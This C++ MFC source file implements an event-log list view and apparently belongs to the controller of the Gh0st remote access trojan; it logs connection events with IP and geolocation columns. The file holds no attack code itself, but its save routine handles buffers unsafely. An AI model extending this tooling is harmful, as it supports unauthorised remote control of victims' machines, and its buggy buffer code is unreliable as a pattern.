// EventView.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "EventView.h"
#include "MainFrm.h"
#include "gh0stView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


#define WM_MYINITIALUPDATE (WM_USER + 101)

typedef struct
{
	char	*title;
	int		nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT e_Column_Data[] = 
{
	{"日志信息",		160},
	{"IP/地理位置",		686}
};

int e_Column_Width = 0;
int	e_Column_Count = 2;

/////////////////////////////////////////////////////////////////////////////
// CEventView

IMPLEMENT_DYNCREATE(CEventView, CListView)

CEventView::CEventView()
{
	//((CGh0stApp *)AfxGetApp())->m_pConnectView = this;//这两句话害人不浅啊，搞的不上线了，郁闷了一天（不能加这两句）
	//m_pListCtrl = NULL;
}

CEventView::~CEventView()
{
}

BEGIN_MESSAGE_MAP(CEventView, CListView)
	//{{AFX_MSG_MAP(CEventView)
	ON_NOTIFY_REFLECT(NM_RCLICK, OnRclick)
	ON_COMMAND(ID_DELETE_ITEM, OnDeleteItem)
	ON_COMMAND(ID_EMPTY_ITEM, OnEmptyItem)
	ON_MESSAGE(WM_MYINITIALUPDATE, OnMyInitialUpdate)
	ON_COMMAND(ID_SAVE_LOG, OnSaveLog)
	ON_COMMAND(ID_COPY, OnCopyToClipboard)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CEventView drawing
/////////////////////////////////////////////////////////////////////////////
// CEventView diagnostics

#ifdef _DEBUG
void CEventView::AssertValid() const
{
	CListView::AssertValid();
}

void CEventView::Dump(CDumpContext& dc) const
{
	CListView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CEventView message handlers

void CEventView::OnDraw(CDC* pDC)
{
	CDocument* pDoc = GetDocument();
	// TODO: add draw code here
}
BOOL CEventView::PreCreateWindow(CREATESTRUCT& cs)
{
	cs.style |= LVS_REPORT;
	return CListView::PreCreateWindow(cs);
}
LRESULT CEventView::OnMyInitialUpdate(WPARAM, LPARAM)
{
	CEventView* pView = this;
 	((CMainFrame*)AfxGetApp()->m_pMainWnd)->SetCurView(0);
	return 0;
}

void CEventView::OnRclick(NMHDR* pNMHDR, LRESULT* pResult) 
{
	*pResult = 0;
	CMenu	popup;
	popup.LoadMenu(IDR_MENU_LOG_LIST);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
}
void CEventView::OnInitialUpdate()
{
	CListView::OnInitialUpdate();

	/**************************************************************************/
	//让界面更漂亮
	NONCLIENTMETRICS ncm;
	memset(&ncm, 0, sizeof(NONCLIENTMETRICS));
	ncm.cbSize = sizeof(NONCLIENTMETRICS);
	
	VERIFY(::SystemParametersInfo(SPI_GETNONCLIENTMETRICS,sizeof(NONCLIENTMETRICS), &ncm, 0));
	ncm.lfMessageFont.lfWeight = 500;
	m_headerCtrl.m_HeaderFont.CreateFontIndirect(&ncm.lfMessageFont);
	SetFont(&(m_headerCtrl.m_HeaderFont));

	/**************************************************************************/
	m_pListCtrl = &GetListCtrl();

	I_ImageList.Create(16, 16, ILC_COLOR32,10, 0);
	HICON hIcon = NULL;//以下为加入3个图标资源
	hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_EVENT), IMAGE_ICON, 16, 16, 0);
	I_ImageList.Add(hIcon);
	ListView_SetImageList(m_pListCtrl->m_hWnd,I_ImageList, LVSIL_SMALL);

	m_pListCtrl->SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_HEADERDRAGDROP|LVS_EX_FLATSB|
			 LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES);//LVS_EX_ONECLICKACTIVATE |  加URL下划线

	for (int i = 0; i < e_Column_Count; i++)
	{
		m_pListCtrl->InsertColumn(i, e_Column_Data[i].title,LVCFMT_LEFT,-1);
		m_pListCtrl->SetColumnWidth(i, e_Column_Data[i].nWidth);
		e_Column_Width += e_Column_Data[i].nWidth; // 总宽度
	}

	/*CRect   rc;
	GetWindowRect(   &rc   );
	int   width   =   rc.Width();
	int   height=   rc.Height();
	m_pListCtrl->InsertColumn(0,"事件发生时间",LVCFMT_LEFT,160);
	m_pListCtrl->InsertColumn(1,"事件内容列表",LVCFMT_LEFT,850);
	//m_pListCtrl->SetColumnWidth(1, width + 138); */
	// 设置数据段
	SetColumnNumeric(0);
	SetColumnNumeric(2);
	PostMessage(WM_MYINITIALUPDATE);
}

void CEventView::InsertItem(LPCTSTR Text,int Mode)
{
	char m_Text[512] = {0};
	CTime time = CTime::GetCurrentTime();		//构造CTime对象 
	CString strTime = time.Format("[%Y-%m-%d %H:%M:%S]");
	int nCount = GetListCtrl().GetItemCount();
	m_pListCtrl->InsertItem(nCount, strTime, 0);//int InsertItem( int nItem, LPCTSTR lpszItem, int nImage );
	m_pListCtrl->SetItemText(nCount, 1, Text);  //BOOL SetItemText( int nItem, int nSubItem, LPTSTR lpszText );
	switch(Mode)
	{
	case 0:
		{    
			m_pListCtrl->SetTextColor(RGB(246,45,244));//粉色显示
			//m_pListCtrl->SetTextColor(RGB(255,0,0));//红色
			//m_pListCtrl->SetTextColor(RGB(0,20,100));//貌似黑色
			//m_pListCtrl->SetTextBkColor(RGB(0,247,255));
			//m_pListCtrl->SetBkColor(RGB(0,247,255));
		}
		break;
	/*
	case 1:
		m_pListCtrl->SetTextColor(RGB(0,180,250));//蓝绿色
		break;
	case 2:
		m_pListCtrl->SetTextColor(RGB(255,0,0));//红色
		break;
	case 3:
		m_pListCtrl->SetTextColor(RGB(200,0,200));//粉色
		break;
	case 4:
		m_pListCtrl->SetTextColor(RGB(0,20,100));//貌似黑色
		break;
	*/
	default:
			m_pListCtrl->SetTextColor(RGB(0,20,100));//貌似黑色
		break;
	}
}

void CEventView::OnDeleteItem() 
{	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	if  (pos  ==  NULL)
	{
		::MessageBox(NULL,"请先选择要删除的事件记录 ...","提示",MB_ICONINFORMATION);
		return;
	}
	else
	{
		while (pos)
		{
			int nItem = m_pListCtrl->GetNextSelectedItem(pos);
			m_pListCtrl->DeleteItem(nItem);
			pos = m_pListCtrl->GetFirstSelectedItemPosition();
		}
	}
}

void CEventView::OnEmptyItem() 
{
	m_pListCtrl->DeleteAllItems();

	/*//这个也行，不过麻烦了点
	int nCnt = m_pListCtrl->GetItemCount();
	for(int Tmpi = nCnt ; Tmpi >= 0 ; Tmpi-- )
	{
	m_pListCtrl->DeleteItem(Tmpi);
	}*/
}
void CEventView::OnSaveLog() 
{
	CTime time = CTime::GetCurrentTime(); ///构造CTime对象 
	CString strTime = time.Format("%Y-%m-%d %H-%M-%S");

    CFileDialog dlg(FALSE, _T("log"), strTime, OFN_OVERWRITEPROMPT, _T("*.log|*.log|*.txt|*.log"), NULL);
    if (dlg.DoModal() != IDOK)
        return;
    CFile file;
    char strip[50] = {0};
    if (file.Open(dlg.GetPathName(), CFile::modeCreate | CFile::modeWrite))
    {
        POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
        while (pos)
        {
            int nItem = m_pListCtrl->GetNextSelectedItem(pos);
            CString strTitle;
            strTitle.Format(_T("时间:%s 事件:%s"), m_pListCtrl->GetItemText(nItem, 0),m_pListCtrl->GetItemText(nItem, 1));
			char *strip = strTitle.GetBuffer(strTitle.GetLength() + 1);	//CString转换为char*
			strTitle.ReleaseBuffer();
            strcat(strip, "\r\n");
            file.Write(strip, strlen(strip));
            memset(strip, 0, 50);
        }
        file.Close();
		strTime = time.Format("[%Y-%m-%d %H:%M:%S]") + " 日志导出成功 ...";
        ::MessageBox(0,strTime,"提示",MB_ICONINFORMATION);
    }
}
/*
将数据复制到剪贴板:   
1.调用OpenClipboard()设置数据的源窗口.   
2.调用EmptyClipboard()清空剪贴板中以前的数据.   
3.调用SetClipboardData()将数据存放到剪贴板上.   
4.调用CloseClipboard()使别的窗口能访问剪贴板. 
*/
/*
#include <Winbase.h>
#include <Windows.h>
#pragma comment(lib, "Kernel32.lib")
*/
void CEventView::OnCopyToClipboard() 
{
    int nItem;
    CString strText(_T(""));
    POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	
    //获取所有选中项目的内容。
    while (pos)
    {
        nItem = m_pListCtrl->GetNextSelectedItem(pos);
        strText += m_pListCtrl->GetItemText(nItem, 0) + " ";
        strText += m_pListCtrl->GetItemText(nItem, 1) + _T("\r\n");
    }
    //将内容保存到剪贴板。
    if (!strText.IsEmpty())
    {
        if (OpenClipboard())
        {
            EmptyClipboard();
            HGLOBAL hClipboardData = GlobalAlloc(GHND | GMEM_SHARE, (strText.GetLength() + 1) * sizeof(TCHAR));
            if (hClipboardData)
            {
                TCHAR* pszData = (TCHAR *)GlobalLock(hClipboardData);
                _tcscpy(pszData, strText);
                GlobalUnlock(hClipboardData);
                SetClipboardData(CF_TEXT, hClipboardData);
            }
            CloseClipboard();
        }
    }
}
